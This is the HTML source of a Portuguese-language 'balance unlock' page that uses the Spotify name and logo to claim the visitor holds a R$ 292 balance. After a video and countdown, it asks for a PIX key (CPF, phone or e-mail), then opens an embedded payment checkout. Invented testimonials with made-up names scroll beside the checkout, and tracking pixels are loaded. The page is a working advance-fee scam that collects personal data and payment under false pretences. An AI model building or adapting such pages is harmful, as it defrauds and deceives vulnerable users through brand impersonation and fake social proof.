<!DOCTYPE html>
<html lang="pt-BR">

<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>

<script>
  window.pixelId = "68c9fa45d1cc1cd7065844a1";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>

<head>

<link rel="preload" href="https://scripts.converteai.net/80a6a49a-7ebf-469d-993e-79d7f30f1366/players/68c9e9a08b434c3ece7b1537/v4/embed.html">
<script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
<link rel="preload" href="https://scripts.converteai.net/80a6a49a-7ebf-469d-993e-79d7f30f1366/players/68c9e9a08b434c3ece7b1537/v4/player.js" as="script">
<link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
<link rel="preload" href="https://cdn.converteai.net/80a6a49a-7ebf-469d-993e-79d7f30f1366/68c9e97a8b434c3ece7b14ff/main.m3u8" as="fetch">
<link rel="dns-prefetch" href="https://cdn.converteai.net">
<link rel="dns-prefetch" href="https://scripts.converteai.net">
<link rel="dns-prefetch" href="https://images.converteai.net">
<link rel="dns-prefetch" href="https://api.vturb.com.br">
<!-- PRELOAD DO ÁUDIO (NOVO) -->
<link rel="preload" href="./audio1.mp3" as="audio" type="audio/mpeg">

<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Desbloqueio de Saldo</title>
<style>
  :root{
    --green:#1db954;
    --dark:#0f8a3e;
    --text:#2b3a47;
    --muted:#5f6e7a;
    --line:#e9eef1;
    --bubble:#fff;
  }
  *{box-sizing:border-box}
  body{margin:0;font-family:Arial,Helvetica,sans-serif;color:var(--text);background:#fff}
  .top-strip{background:var(--green);color:#fff;font-weight:800;letter-spacing:.5px;text-transform:uppercase;text-align:center;padding:14px;font-size:18px}
  .wrap{max-width:760px;margin:26px auto 60px;padding:0 16px}
  .header{display:flex;align-items:center;justify-content:space-between;gap:12px}
  .logo{height:28px}
  .saldo-chip{display:inline-flex;align-items:center;gap:10px;border:2px solid #dfe8e3;border-radius:10px;padding:10px 14px;font-weight:800;background:#fff;box-shadow:0 3px 10px rgba(0,0,0,.06)}
  .saldo-chip small{display:block;font-size:11px;color:#6d7a86;font-weight:700;text-transform:uppercase;letter-spacing:.6px;text-align:center}
  .saldo-chip b{display:block;color:var(--green);font-size:18px}
  .divider{height:2px;background:var(--line);margin:18px 0}
  h1{color:var(--green);text-transform:uppercase;font-size:24px;text-align:center;margin:8px 0 6px}
  .sub{text-align:center;color:#2d3b46;max-width:540px;margin:0 auto 16px;font-size:18px;line-height:1.35}
  #videoWrap{width:100%;max-width:600px;margin:0 auto 22px;border-radius:6px;overflow:hidden;box-shadow:0 10px 25px rgba(0,0,0,.12)}
  .cta{display:block;width:100%;max-width:420px;margin:14px auto 0;background:var(--green);color:#fff;border:none;border-radius:8px;padding:16px 22px;font-weight:800;font-size:16px;cursor:pointer;transition:filter .2s ease,transform .02s ease}
  .cta:active{transform: translateY(1px)}
  .cta[disabled]{opacity:.55;cursor:not-allowed;filter:grayscale(30%)}
  .note{text-align:center;color:#8a98a4;font-size:12px;margin-top:12px}

  /* Área PIX */
  #pixArea{display:none;max-width:760px;margin:22px auto 0;padding:0 16px}
  .pix-card{border:1px solid var(--line);border-radius:12px;padding:18px}
  .pix-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
  .pix-title{font-weight:800}
  .pix-saldo{font-weight:800;color:var(--green)}
  .pix-types{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:12px 0 14px}
  .pix-type{display:flex;flex-direction:column;align-items:center;gap:8px;border:1px solid var(--line);border-radius:10px;padding:12px;cursor:pointer;background:#fff;user-select:none}
  .pix-type.active{outline:2px solid var(--green);outline-offset:0}
  .pix-type img{width:26px;height:26px;object-fit:contain}
  .pix-type b{font-size:13px}
  .pix-input{width:100%;border:1px solid var(--line);border-radius:10px;padding:14px 12px;font-size:15px;margin-bottom:10px}
  .pix-amount{width:100%;border:1px solid var(--line);border-radius:10px;padding:14px 12px;font-size:15px;margin-bottom:14px}
  .pix-btn{display:block;width:100%;max-width:280px;margin:0 auto;background:var(--green);color:#fff;border:0;border-radius:8px;padding:14px 18px;font-weight:800;cursor:pointer}
  .pix-btn .badge{display:inline-block;margin-left:8px;padding:3px 8px;border-radius:999px;background:#0fb35a;color:#fff;font-size:12px;vertical-align:middle}
  .pix-error{color:#d93025;font-size:13px;text-align:center;margin-top:8px;display:none}

  /* Checkout embutido */
  #checkoutArea{display:none;max-width:760px;margin:22px auto 0;padding:0 16px}
  #checkoutFrame{width:100%;height:750px;border:0;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,.12)}

  /* Social proof scroller (novo) */
  #socialProof{display:none;max-width:760px;margin:16px auto 40px;padding:0 16px}
  .sp-rail{position:relative;overflow:hidden;border:1px solid var(--line);border-radius:14px;padding:14px;background:#fff}
  .sp-track{display:flex;width:200%;animation:sp-marquee 45s linear infinite}
  .sp-group{display:flex;width:50%;gap:18px}
  .sp-item{width:120px;flex:0 0 120px;display:flex;flex-direction:column;align-items:center;gap:8px}
  .sp-note{position:relative;background:var(--bubble);border:1px solid var(--line);border-radius:14px;padding:8px 10px;font-size:12px;line-height:1.25;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.06)}
  .sp-note::after{content:"";position:absolute;left:22px;bottom:-6px;border-width:6px;border-style:solid;border-color:var(--bubble) transparent transparent transparent;filter:drop-shadow(0 -1px 0 var(--line))}
  .sp-avatar{position:relative;width:64px;height:64px;border-radius:999px;overflow:hidden;border:3px solid #fff;box-shadow:0 2px 8px rgba(0,0,0,.12)}
  .sp-avatar img{width:100%;height:100%;object-fit:cover;display:block;border-radius:inherit}
  .sp-dot{position:absolute;right:0;bottom:0;width:12px;height:12px;border-radius:999px;background:#25d366;border:2px solid #fff}
  .sp-name{font-size:12px;color:#4a5864}
  @keyframes sp-marquee{
    0%{transform:translateX(0)}
    100%{transform:translateX(-50%)}
  }
  @media (max-width:520px){
    .top-strip{font-size:14px;padding:12px}
    .pix-types{grid-template-columns:repeat(2,1fr)}
    .sp-item{width:110px;flex-basis:110px}
  }

  /* ====== Rádio estilo Spotify (NOVO) ====== */
  #radioWrap{display:none;max-width:760px;margin:14px auto 0;padding:0 16px}
  .radio-card{
    background:linear-gradient(135deg,#161616,#212121);
    border:1px solid var(--line);
    border-radius:14px;
    padding:12px;
    color:#eef2f3;
    box-shadow:0 10px 25px rgba(0,0,0,.12);
  }
  .radio-row{display:flex;align-items:center;gap:12px}
  .radio-logo{width:44px;height:44px;border-radius:999px;overflow:hidden;background:#fff;display:flex;align-items:center;justify-content:center}
  .radio-logo img{width:30px;height:30px;object-fit:contain}
  .radio-meta{display:flex;flex-direction:column;gap:4px}
  .radio-title{font-weight:800;font-size:14px}
  .radio-sub{font-size:12px;color:#b9c4cc}
  .radio-eq{margin-left:auto;display:flex;gap:3px;align-items:flex-end;height:16px}
  .radio-eq span{width:3px;height:6px;background:#7aa6ff;border-radius:2px;opacity:.8;transform-origin:bottom}
  .radio-btn{
    margin-left:8px;min-width:38px;height:38px;border:none;border-radius:999px;background:var(--green);color:#fff;font-size:18px;cursor:pointer
  }
  .radio-bar{margin-top:8px;height:4px;background:#2a2a2a;border-radius:999px;overflow:hidden}
  .radio-bar-fill{height:100%;width:0;background:var(--green)}
  .radio-time{display:flex;justify-content:space-between;color:#9aa7af;font-size:11px;margin-top:4px}
  .is-playing .radio-eq span{animation:eqPulse .6s ease-in-out infinite alternate}
  .is-playing .radio-eq span:nth-child(2){animation-duration:.5s}
  .is-playing .radio-eq span:nth-child(3){animation-duration:.7s}
  .is-playing .radio-eq span:nth-child(4){animation-duration:.55s}
  .is-playing .radio-eq span:nth-child(5){animation-duration:.65s}
  @keyframes eqPulse{from{height:5px}to{height:16px}}
</style>
</head>
<body>

<div class="top-strip">ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.</div>

<div class="wrap">
  <div class="header">
    <img class="logo" src="logo.png" alt="Spotify">
    <div class="saldo-chip">
      <div>
        <small>SALDO</small>
        <b id="saldoValor">R$ 292,00</b>
      </div>
    </div>
  </div>

  <div class="divider"></div>

  <h1>Desbloqueio de saldo</h1>
  <p class="sub">Veja como liberar seu saque assistindo ao vídeo.</p>

  <!-- SDK do Smartplayer -->
<script type="text/javascript">
  var s = document.createElement("script");
  s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
  s.async = true;
  document.head.appendChild(s);
</script>

<!-- Container do player -->
<div id="ifr_68c9f5562372e2ed854c221c_wrapper" style="margin: 0 auto; width: 100%;">
  <div id="ifr_68c9f5562372e2ed854c221c_aspect" style="position: relative; padding: 60% 0 0 0;">
    <iframe
      id="ifr_68c9f5562372e2ed854c221c"
      src="about:blank"
      frameborder="0"
      allowfullscreen
      referrerpolicy="origin"
      style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
      onload="this.onload=null; this.src='https://scripts.converteai.net/80a6a49a-7ebf-469d-993e-79d7f30f1366/players/68c9f5562372e2ed854c221c/v4/embed.html' + (location.search || '?') + '&vl=' + encodeURIComponent(location.href);">
    </iframe>
  </div>
</div>

  <!-- botão -->
  <button id="cta" class="cta" disabled>DESBLOQUEAR SAQUE (aguarde 30s)</button>
  <div class="note" id="countNote">O botão será liberado após 30 segundos de exibição.</div>

  <!-- ===== Rádio (aparece após clicar no CTA) ===== -->
  <div id="radioWrap" aria-hidden="true">
    <div id="radioCard" class="radio-card">
      <div class="radio-row">
        <div class="radio-logo"><img src="logo2.png" alt="Logo"></div>
        <div class="radio-meta">
          <div class="radio-title">Rádio • Spotify</div>
          <div class="radio-sub">Avaliação & desbloqueio de saldo</div>
        </div>
        <div class="radio-eq" aria-hidden="true">
          <span></span><span></span><span></span><span></span><span></span>
        </div>
        <button id="radioBtn" class="radio-btn" type="button" aria-label="Pausar/Retomar">⏵</button>
      </div>
      <div class="radio-bar" aria-hidden="true"><div id="radioBarFill" class="radio-bar-fill"></div></div>
      <div class="radio-time"><span id="radioTime">00:00</span><span id="radioDur">00:00</span></div>
    </div>
    <!-- ÁUDIO AJUSTADO -->
    <audio id="narrationAudio" preload="auto" src="./audio1.mp3" playsinline crossorigin="anonymous"></audio>
  </div>

  <!-- PASSO 1: Confirme sua chave PIX -->
  <div id="pixArea">
    <div class="pix-card">
      <div class="pix-header">
        <div class="pix-title">Confirme sua chave PIX para saque</div>
        <div class="pix-saldo" id="pixSaldo">R$ 292,00</div>
      </div>

      <div class="pix-types" id="pixTypes">
        <div class="pix-type active" data-type="cpf">
          <img src="cpf.png" alt="CPF/CNPJ">
          <b>CPF / CNPJ</b>
        </div>
        <div class="pix-type" data-type="tel">
          <img src="tel.png" alt="Telefone">
          <b>Telefone</b>
        </div>
        <div class="pix-type" data-type="email">
          <img src="email.png" alt="E-mail">
          <b>E-mail</b>
        </div>
        <div class="pix-type" data-type="aleatoria">
          <img src="aleatoria.png" alt="Aleatória">
          <b>Aleatória</b>
        </div>
      </div>

      <input id="pixKey" class="pix-input" type="text" placeholder="Digite sua chave PIX aqui">
      <input id="pixAmount" class="pix-amount" type="text" value="R$ 292,00" readonly>

      <button id="pixSubmit" class="pix-btn" type="button">PIX VIA RAPIDP <span id="pixBadge" class="badge">CPF/CNPJ</span></button>
      <div id="pixError" class="pix-error">Chave PIX inválida. Verifique e tente novamente.</div>
    </div>
  </div>

  <!-- PASSO 2: Checkout embutido -->
  <div id="checkoutArea">
    <iframe id="checkoutFrame" allowpaymentrequest allow="payment *; fullscreen"></iframe>
  </div>

  <!-- Social proof scroller (mostra quando checkout abre) -->
  <div id="socialProof" aria-hidden="true">
    <div class="sp-rail">
      <div class="sp-track">
        <!-- Grupo 1 -->
        <div class="sp-group">
          <div class="sp-item">
            <div class="sp-note">“Caiu rapidinho! 😍”</div>
            <div class="sp-avatar"><img src="perfil1.png" alt="Ana Souza"><span class="sp-dot"></span></div>
            <div class="sp-name">Ana Souza</div>
          </div>
          <div class="sp-item">
            <div class="sp-note">“Processo simples 👌”</div>
            <div class="sp-avatar"><img src="perfil2.png" alt="Diego Lima"><span class="sp-dot"></span></div>
            <div class="sp-name">Diego Lima</div>
          </div>
          <div class="sp-item">
            <div class="sp-note">“Pix em minutos ⏱️”</div>
            <div class="sp-avatar"><img src="perfil3.png" alt="Larissa Moraes"><span class="sp-dot"></span></div>
            <div class="sp-name">Larissa Moraes</div>
          </div>
          <div class="sp-item">
            <div class="sp-note">“Muito prático! 🙌”</div>
            <div class="sp-avatar"><img src="perfil4.png" alt="Rafael Nunes"><span class="sp-dot"></span></div>
            <div class="sp-name">Rafael Nunes</div>
          </div>
          <div class="sp-item">
            <div class="sp-note">“Sem dor de cabeça 😮‍💨”</div>
            <div class="sp-avatar"><img src="perfil5.png" alt="Beatriz Rocha"><span class="sp-dot"></span></div>
            <div class="sp-name">Beatriz Rocha</div>
          </div>
          <div class="sp-item">
            <div class="sp-note">“Indico demais ⭐”</div>
            <div class="sp-avatar"><img src="perfil6.png" alt="Carlos Mendes"><span class="sp-dot"></span></div>
            <div class="sp-name">Carlos Mendes</div>
          </div>
          <div class="sp-item">
            <div class="sp-note">“Seguro e rápido ✅”</div>
            <div class="sp-avatar"><img src="perfil7.png" alt="Julia Prado"><span class="sp-dot"></span></div>
            <div class="sp-name">Julia Prado</div>
          </div>
          <div class="sp-item">
            <div class="sp-note">“Tudo certo por aqui 👍”</div>
            <div class="sp-avatar"><img src="perfil8.png" alt="Marcos Alves"><span class="sp-dot"></span></div>
            <div class="sp-name">Marcos Alves</div>
          </div>
          <div class="sp-item">
            <div class="sp-note">“Curti a experiência 💚”</div>
            <div class="sp-avatar"><img src="perfil9.png" alt="Gabriela Lins"><span class="sp-dot"></span></div>
            <div class="sp-name">Gabriela Lins</div>
          </div>
          <div class="sp-item">
            <div class="sp-note">“Recomendo! 😉”</div>
            <div class="sp-avatar"><img src="perfil10.png" alt="Bruno Teixeira"><span class="sp-dot"></span></div>
            <div class="sp-name">Bruno Teixeira</div>
          </div>
        </div>
       
        </div>
      </div>
    </div>
  </div>
</div>

<script>
  const CHECKOUT_URL = "https://pay.cakto.com.br/dx9jf4t_573215";
  const PRELOAD_BEFORE = 5; // pré-carrega faltando 5s

  const saldoLabel = document.getElementById('saldoValor');
  (function setSaldoFromQuery(){
    const q = new URLSearchParams(location.search);
    if(!q.has('saldo')) return;
    let v = q.get('saldo');
    let num = Number(v.toString().replace('.',',').replace(/[^\d,]/g,'').replace(',','.'));
    if(!isNaN(num) && num>0){
      const fmt = num.toLocaleString('pt-BR',{style:'currency',currency:'BRL'});
      saldoLabel.textContent = fmt;
      document.getElementById('pixSaldo').textContent = fmt;
      document.getElementById('pixAmount').value = fmt;
    }
  })();

  const cta = document.getElementById('cta');
  const note = document.getElementById('countNote');
  const pixArea = document.getElementById('pixArea');
  const pixTypes = document.getElementById('pixTypes');
  const pixKey = document.getElementById('pixKey');
  const pixAmount = document.getElementById('pixAmount');
  const pixSubmit = document.getElementById('pixSubmit');
  const pixError = document.getElementById('pixError');
  const pixBadge = document.getElementById('pixBadge');

  const checkoutArea  = document.getElementById('checkoutArea');
  const checkoutFrame = document.getElementById('checkoutFrame');
  const socialProof   = document.getElementById('socialProof');

  const DELAY_MS = 0000; // mantendo como você deixou
  let remaining = Math.ceil(DELAY_MS/1000);
  let tick, preloaded = false;

  function startCountdown(){
    updateLabel();
    tick = setInterval(()=>{
      remaining--;
      updateLabel();

      if(!preloaded && remaining <= PRELOAD_BEFORE){
        checkoutFrame.src = CHECKOUT_URL + (location.search || "");
        preloaded = true;
      }

      if(remaining<=0){
        clearInterval(tick);
        liberarBotao();
      }
    },1000);
  }

  function updateLabel(){
    if(remaining>0){
      cta.textContent = `DESBLOQUEAR SAQUE (aguarde ${remaining}s)`;
      note.textContent = `O botão será liberado após ${remaining}s.`;
    }
  }

  function liberarBotao(){
    cta.disabled = false;
    cta.textContent = "DESBLOQUEAR SAQUE";
    note.textContent = "Botão liberado.";
  }

  startCountdown();

  // Clique no CTA -> mostra área PIX (passo 1)
  cta.addEventListener('click', ()=>{
    if(cta.disabled) return;
    const saldoTxt = saldoLabel.textContent.trim();
    document.getElementById('pixSaldo').textContent = saldoTxt || 'R$ 0,00';
    pixAmount.value = saldoTxt || 'R$ 0,00';
    pixArea.style.display = 'block';
    pixArea.scrollIntoView({behavior:'smooth', block:'start'});
    pixKey.focus();
  });

  // ====== Máscaras e seleção de tipo ======
  function onlyDigits(s){ return (s||'').replace(/\D+/g,''); }

  function maskCPF(v){
    const d = onlyDigits(v).slice(0,11);
    return d.replace(/(\d{3})(\d)/,'$1.$2')
            .replace(/(\d{3})(\d)/,'$1.$2')
            .replace(/(\d{3})(\d{1,2})$/,'$1-$2');
  }
  function maskCNPJ(v){
    const d = onlyDigits(v).slice(0,14);
    return d.replace(/^(\d{2})(\d)/,'$1.$2')
            .replace(/^(\d{2})\.(\d{3})(\d)/,'$1.$2.$3')
            .replace(/\.(\d{3})(\d)/,'.$1/$2')
            .replace(/(\d{4})(\d)/,'$1-$2');
  }
  function maskPhone(v){
    const d = onlyDigits(v).slice(0,11);
    if(d.length <= 10){
      return d.replace(/^(\d{0,2})(\d{0,4})(\d{0,4}).*/,'($1) $2-$3').trim();
    }
    return d.replace(/^(\d{0,2})(\d{0,5})(\d{0,4}).*/,'($1) $2-$3').trim();
  }

  function updateBadge(type){
    const map = {cpf:'CPF/CNPJ', tel:'Telefone', email:'E-mail', aleatoria:'Aleatória'};
    pixBadge.textContent = map[type] || 'CPF/CNPJ';
  }

  // Seleção de tipo de chave
  pixTypes.addEventListener('click', (e)=>{
    const card = e.target.closest('.pix-type');
    if(!card) return;
    [...pixTypes.children].forEach(el=>el.classList.remove('active'));
    card.classList.add('active');
    const t = card.dataset.type;

    if(t==='cpf'){
      pixKey.placeholder = 'Digite seu CPF ou CNPJ (apenas números)';
      pixKey.inputMode = 'numeric';
      pixKey.value = '';
    }else if(t==='tel'){
      pixKey.placeholder = 'Digite seu telefone com DDD (somente números)';
      pixKey.inputMode = 'numeric';
      pixKey.value = '';
    }else if(t==='email'){
      pixKey.placeholder = 'Digite seu e-mail';
      pixKey.inputMode = 'email';
      pixKey.value = '';
    }else{
      pixKey.placeholder = 'Cole sua chave aleatória';
      pixKey.inputMode = 'text';
      pixKey.value = '';
    }
    updateBadge(t);
    pixKey.focus();
  });

  // Máscara oninput
  pixKey.addEventListener('input', ()=>{
    const type = document.querySelector('.pix-type.active')?.dataset.type || 'cpf';
    if(type==='cpf'){
      const d = onlyDigits(pixKey.value);
      pixKey.value = d.length > 11 ? maskCNPJ(d) : maskCPF(d);
    }else if(type==='tel'){
      pixKey.value = maskPhone(pixKey.value);
    }
  });

  // ====== Validação simples ======
  function isValidPixKey(){
    const type = document.querySelector('.pix-type.active')?.dataset.type || 'cpf';
    const raw = (pixKey.value || '').trim();

    if(type==='email'){
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(raw);
    }
    if(type==='tel'){
      const n = onlyDigits(raw);
      return n.length >= 10 && n.length <= 11;
    }
    if(type==='cpf'){
      const n = onlyDigits(raw);
      return n.length === 11 || n.length === 14;
    }
    return /^[A-Za-z0-9\-]{10,80}$/.test(raw);
  }

  // Botão "PIX VIA RAPIDP" -> valida e mostra checkout + social proof
  pixSubmit.addEventListener('click', ()=>{
    pixError.style.display = 'none';
    if(!isValidPixKey()){
      pixError.style.display = 'block';
      return;
    }
    checkoutArea.style.display = 'block';
    socialProof.style.display = 'block';
    socialProof.setAttribute('aria-hidden','false');
    checkoutArea.scrollIntoView({behavior:'smooth', block:'start'});
  });
</script>

<!-- ===== Script do player de rádio (fix p/ produção + captura) ===== -->
<script>
  (function(){
    const radioWrap = document.getElementById('radioWrap');
    const radioCard = document.getElementById('radioCard');
    const radioBtn  = document.getElementById('radioBtn');
    const barFill   = document.getElementById('radioBarFill');
    const tCur      = document.getElementById('radioTime');
    const tDur      = document.getElementById('radioDur');
    const audio     = document.getElementById('narrationAudio');
    const ctaEl     = document.getElementById('cta');

    // caminho relativo garante compatibilidade com subpaths (GitHub Pages/Render)
    const AUDIO_SRC = './audio1.mp3';

    function fmt(t){const m=Math.floor(t/60),s=Math.floor(t%60);return String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');}
    function startUIPlaying(){ radioCard.classList.add('is-playing'); radioBtn.textContent='⏸'; }
    function setUIPaused(){ radioCard.classList.remove('is-playing'); radioBtn.textContent='⏵'; }

    function tryPlay(){
      const p = audio.play();
      if(p && typeof p.then==='function'){
        p.then(startUIPlaying).catch((err)=>{
          console.warn('Play bloqueado (use o botão):', err);
          setUIPaused();
        });
      }else{
        startUIPlaying();
      }
    }

    // Captura o clique do CTA ANTES do outro listener (capture:true) e só na 1ª vez (once:true)
    let revealed = false;
    function onCTAUnlock(){
      if (ctaEl.disabled) return;

      if (!revealed) {
        revealed = true;
        radioWrap.style.display = 'block';
        radioWrap.setAttribute('aria-hidden','false');

        try {
          audio.pause();
          // cache-buster para forçar um novo carregamento sob o gesto do usuário
          audio.src = AUDIO_SRC + '?v=' + Date.now();
          audio.muted = false;
          audio.currentTime = 0;
          audio.load();
          tryPlay();
        } catch (e) {
          console.warn('Falha ao iniciar áudio:', e);
          setUIPaused();
        }
      }
    }
    ctaEl.addEventListener('click', onCTAUnlock, { once:true, capture:true });

    // Botão play/pause manual
    radioBtn.addEventListener('click', ()=>{
      if (audio.paused) tryPlay(); else { audio.pause(); setUIPaused(); }
    });

    audio.addEventListener('loadedmetadata', ()=>{
      if (isFinite(audio.duration)) tDur.textContent = fmt(audio.duration);
    });

    audio.addEventListener('timeupdate', ()=>{
      if (audio.duration) {
        barFill.style.width = (audio.currentTime / audio.duration * 100).toFixed(2) + '%';
        tCur.textContent = fmt(audio.currentTime);
      }
    });

    audio.addEventListener('ended', ()=>{ setUIPaused(); });

    audio.addEventListener('error', ()=>{
      console.warn('Erro carregando áudio. Confirme se ./audio1.mp3 está ao lado do HTML, retorna 200 com Content-Type: audio/mpeg e Accept-Ranges: bytes.');
    });
  })();
</script>

</body>
</html>





